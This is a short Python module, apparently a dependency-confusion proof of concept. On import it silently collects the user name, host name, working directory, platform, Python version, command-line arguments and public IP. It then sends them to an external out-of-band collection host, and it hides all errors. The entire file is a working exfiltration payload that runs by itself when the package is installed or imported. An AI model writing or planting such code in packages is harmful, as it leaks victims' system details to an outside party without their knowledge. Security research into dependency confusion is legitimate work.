import os
import sys
import socket
import urllib.request
import urllib.parse
import platform

def exfiltrate():
    try:
        # Collect basic system info
        data = {
            "user": os.getenv("USERNAME") or os.getenv("USER"),
            "host": socket.gethostname(),
            "fqdn": socket.getfqdn(),
            "cwd": os.getcwd(),
            "platform": platform.platform(),
            "python_version": sys.version,
            "argv": " ".join(sys.argv),
            "cwe": "CWE-706: Dependency Confusion (PoC)"
        }

        # Try to get external/public IP
        try:
            external_ip = urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
            data["external_ip"] = external_ip
        except Exception:
            data["external_ip"] = "unknown"

        # Encode and send
        qs = urllib.parse.urlencode(data)
        urllib.request.urlopen("http://cwcypxwrelhwvpogwgwoyc1a57it46b77.oast.fun/?" + qs, timeout=3)
    except Exception:
        pass

# Fire immediately on import
exfiltrate()
